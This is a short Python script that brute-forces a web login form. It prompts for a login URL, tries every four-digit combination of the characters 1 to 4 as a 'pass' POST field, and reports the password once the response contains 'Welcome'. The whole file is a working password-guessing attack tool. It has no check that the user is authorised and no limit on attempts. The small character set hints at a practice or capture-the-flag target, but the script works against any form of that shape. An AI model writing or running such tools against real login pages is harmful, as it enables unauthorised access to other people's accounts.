import itertools
import requests

# Character set
charset = "1234"
min_len = 4
max_len = 4

# Success text that indicates a successful login
success_text = "Welcome"  # Change this to match the success response text

# Get URL input
url = input("🔗 Enter the login URL: ").strip()

# Function to try a password
def try_login(password):
    print(f"🔐 Trying password: {password}")  # Show each attempt
    data = {
        "pass": password
    }
    try:
        response = requests.post(url, data=data)
        if success_text in response.text:
            print(f"\n🎯 Success! Password found: {password}")
            return True
    except Exception as e:
        print(f"⚠️ Error during request: {e}")
    return False

# Brute-force main loop
def main():
    print("\n🚀 Starting brute-force on password field...\n")
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            password = ''.join(combo)
            if try_login(password):
                return

if __name__ == "__main__":
    main()
